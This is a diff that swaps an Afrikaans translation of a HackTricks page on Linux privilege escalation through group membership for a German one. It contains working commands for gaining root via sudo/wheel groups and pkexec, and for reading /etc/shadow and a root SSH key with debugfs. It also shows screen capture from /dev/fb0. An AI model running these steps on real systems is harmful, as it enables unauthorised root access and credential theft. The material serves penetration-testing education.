@@ -1,30 +1,30 @@
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
 
 <figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) om maklik te bou en **werkvloei** te **automate** wat deur die wêreld se **mees gevorderde** gemeenskap gereedskap aangedryf word.\
-Kry Toegang Vandag:
+Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
+Erhalten Sie noch heute Zugang:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
-# Sudo/Admin Groepe
+# Sudo/Admin Gruppen
 
-## **PE - Metode 1**
+## **PE - Methode 1**
 
-**Soms**, **per standaard \(of omdat sommige sagteware dit benodig\)** binne die **/etc/sudoers** lêer kan jy sommige van hierdie lyne vind:
+**Manchmal**, **standardmäßig \(oder weil einige Software es benötigt\)** finden Sie in der **/etc/sudoers**-Datei einige dieser Zeilen:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -32,36 +32,35 @@ Kry Toegang Vandag:
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
-Dit beteken dat **enige gebruiker wat tot die groep sudo of admin behoort, enigiets as sudo kan uitvoer**.
+Das bedeutet, dass **jeder Benutzer, der zur Gruppe sudo oder admin gehört, alles als sudo ausführen kann**.
 
-As dit die geval is, om **root te word kan jy net uitvoer**:
+Wenn dies der Fall ist, können Sie **einfach ausführen, um root zu werden**:
 ```text
 sudo su
 ```
-## PE - Metode 2
+## PE - Methode 2
 
-Vind alle suid binaire en kyk of daar die binaire **Pkexec** is:
+Finde alle SUID-Binärdateien und überprüfe, ob die Binärdatei **Pkexec** vorhanden ist:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-As jy vind dat die binêre pkexec 'n SUID-binêre is en jy behoort tot sudo of admin, kan jy waarskynlik binêre uitvoer as sudo met behulp van pkexec. 
-Kontroleer die inhoud van:
+Wenn Sie feststellen, dass die Binärdatei pkexec eine SUID-Binärdatei ist und Sie zu sudo oder admin gehören, könnten Sie wahrscheinlich Binärdateien als sudo mit pkexec ausführen. Überprüfen Sie den Inhalt von:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-Daar sal jy vind watter groepe toegelaat word om **pkexec** uit te voer en **per standaard** kan sommige van die groepe **sudo of admin** in linux **verskyn**.
+Dort finden Sie, welche Gruppen berechtigt sind, **pkexec** auszuführen, und **standardmäßig** können in einigen Linux-Systemen **einige der Gruppen sudo oder admin** **erscheinen**.
 
-Om **root te word kan jy uitvoer**:
+Um **root zu werden, können Sie ausführen**:
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
-As jy probeer om **pkexec** uit te voer en jy kry hierdie **error**:
+Wenn Sie versuchen, **pkexec** auszuführen und Sie diese **Fehlermeldung** erhalten:
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**Dit is nie omdat jy nie toestemmings het nie, maar omdat jy nie sonder 'n GUI gekonnekteer is nie**. En daar is 'n oplossing vir hierdie probleem hier: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Jy het **2 verskillende ssh-sessies** nodig:
+**Es liegt nicht daran, dass Sie keine Berechtigungen haben, sondern daran, dass Sie ohne eine GUI nicht verbunden sind**. Und es gibt eine Lösung für dieses Problem hier: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Sie benötigen **2 verschiedene SSH-Sitzungen**:
 
 {% code title="session1" %}
 ```bash
@@ -71,38 +70,38 @@ pkexec "/bin/bash" #Step 3, execute pkexec
 ```
 {% endcode %}
 
-{% code title="sessie2" %}
+{% code title="session2" %}
 ```bash
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 #Step 4, you will be asked in this session to authenticate to pkexec
 ```
 {% endcode %}
 
-# Wheel Group
+# Wheel-Gruppe
 
-**Soms**, **per standaard** binne die **/etc/sudoers** lêer kan jy hierdie lyn vind:
+**Manchmal** **findet man standardmäßig** in der **/etc/sudoers**-Datei diese Zeile:
 ```text
 %wheel	ALL=(ALL:ALL) ALL
 ```
-Dit beteken dat **enige gebruiker wat tot die groep wheel behoort, enigiets as sudo kan uitvoer**.
+Das bedeutet, dass **jeder Benutzer, der zur Gruppe wheel gehört, alles als sudo ausführen kann**.
 
-As dit die geval is, om **root te word kan jy net uitvoer**:
+Wenn dies der Fall ist, können Sie **um root zu werden einfach ausführen**:
 ```text
 sudo su
 ```
-# Shadow Group
+# Shadow-Gruppe
 
-Users from the **group shadow** can **read** the **/etc/shadow** file:
+Benutzer der **Gruppe shadow** können die **/etc/shadow**-Datei **lesen**:
 ```text
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
-So, lees die lêer en probeer om **sommige hashes te kraak**.
+So, lesen Sie die Datei und versuchen Sie, **einige Hashes zu knacken**.
 
-# Skyf Groep
+# Disk Group
 
-Hierdie voorreg is byna **gelyk aan worteltoegang** aangesien jy toegang het tot al die data binne die masjien.
+Dieses Privileg ist fast **äquivalent zu Root-Zugriff**, da Sie auf alle Daten innerhalb der Maschine zugreifen können.
 
-Lêers:`/dev/sd[a-z][1-9]`
+Dateien: `/dev/sd[a-z][1-9]`
 ```text
 debugfs /dev/sda1
 debugfs: cd /root
@@ -110,75 +109,74 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-Let daarop dat jy met debugfs ook **lêers kan skryf**. Byvoorbeeld, om `/tmp/asd1.txt` na `/tmp/asd2.txt` te kopieer, kan jy doen:
+Beachten Sie, dass Sie mit debugfs auch **Dateien schreiben** können. Um beispielsweise `/tmp/asd1.txt` nach `/tmp/asd2.txt` zu kopieren, können Sie Folgendes tun:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-However, if you try to **write files owned by root** \(like `/etc/shadow` or `/etc/passwd`\) you will have a "**Toegang geweier**" error.
+Allerdings, wenn Sie versuchen, **Dateien, die root gehören** \(wie `/etc/shadow` oder `/etc/passwd`\) zu **schreiben**, erhalten Sie einen "**Zugriff verweigert**" Fehler.
 
-# Video Groep
+# Video Gruppe
 
-Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:
+Mit dem Befehl `w` können Sie **herausfinden, wer im System angemeldet ist** und es wird eine Ausgabe wie die folgende angezeigt:
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
-Die **tty1** beteken dat die gebruiker **yossi fisies ingelogde** is op 'n terminal op die masjien.
+Die **tty1** bedeutet, dass der Benutzer **yossi physisch** an einem Terminal auf der Maschine angemeldet ist.
 
-Die **video groep** het toegang om die skermuitset te sien. Basies kan jy die skerms observeer. Om dit te doen, moet jy die **huidige beeld op die skerm** in rou data gryp en die resolusie wat die skerm gebruik, kry. Die skermdata kan gestoor word in `/dev/fb0` en jy kan die resolusie van hierdie skerm op `/sys/class/graphics/fb0/virtual_size` vind.
+Die **video-Gruppe** hat Zugriff auf die Anzeige der Bildschirmausgabe. Grundsätzlich können Sie die Bildschirme beobachten. Um dies zu tun, müssen Sie **das aktuelle Bild auf dem Bildschirm** in Rohdaten erfassen und die Auflösung ermitteln, die der Bildschirm verwendet. Die Bildschirmdaten können in `/dev/fb0` gespeichert werden, und Sie können die Auflösung dieses Bildschirms unter `/sys/class/graphics/fb0/virtual_size` finden.
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-Om die **rauwe beeld** te **open**, kan jy **GIMP** gebruik, kies die **`screen.raw`** lêer en kies as lêertipe **Raw image data**:
+Um das **rohe Bild** zu **öffnen**, können Sie **GIMP** verwenden, die **`screen.raw`**-Datei auswählen und als Dateityp **Rohe Bilddaten** auswählen:
 
 ![](../../.gitbook/assets/image%20%28208%29.png)
 
-Verander dan die Breedte en Hoogte na diegene wat op die skerm gebruik word en kyk na verskillende Beeldtipes \(en kies die een wat die skerm beter wys\):
+Ändern Sie dann die Breite und Höhe auf die Werte, die auf dem Bildschirm verwendet werden, und überprüfen Sie verschiedene Bildtypen \(und wählen Sie den aus, der den Bildschirm besser darstellt\):
 
 ![](../../.gitbook/assets/image%20%28295%29.png)
 
-# Root Groep
+# Root-Gruppe
 
-Dit lyk of **lede van die root groep** standaard toegang kan hê om sommige **diens** konfigurasielêers of sommige **biblioteek** lêers of **ander interessante dinge** wat gebruik kan word om voorregte te verhoog, te **wysig**...
+Es scheint, dass standardmäßig **Mitglieder der Root-Gruppe** Zugriff auf die **Änderung** einiger **Dienst**-Konfigurationsdateien oder einiger **Bibliotheks**-Dateien oder **anderer interessanter Dinge** haben, die zur Eskalation von Rechten verwendet werden könnten...
 
-**Kontroleer watter lêers root lede kan wysig**:
+**Überprüfen Sie, welche Dateien Root-Mitglieder ändern können**:
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
-# Docker Groep
+# Docker-Gruppe
 
-Jy kan die wortel lêer stelsel van die gasheer masjien aan 'n instansie se volume monteer, sodat wanneer die instansie begin, dit onmiddellik 'n `chroot` in daardie volume laai. Dit gee jou effektief wortel op die masjien.
+Sie können das Root-Dateisystem des Host-Systems an das Volume einer Instanz anhängen, sodass beim Start der Instanz sofort ein `chroot` in dieses Volume geladen wird. Dies gibt Ihnen effektiv Root-Zugriff auf die Maschine.
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
 {% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
 
-# lxc/lxd Groep
+# lxc/lxd-Gruppe
 
-[lxc - Privilege Escalation](lxd-privilege-escalation.md)
-
+[lxc - Privilegieneskalation](lxd-privilege-escalation.md)
 
 <figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) om maklik te bou en **werkvloei** te **automate** wat deur die wêreld se **mees gevorderde** gemeenskap gereedskap aangedryf word.\
-Kry Vandag Toegang:
+Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
+Zugang heute erhalten:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS-Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>HackTricks unterstützen</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
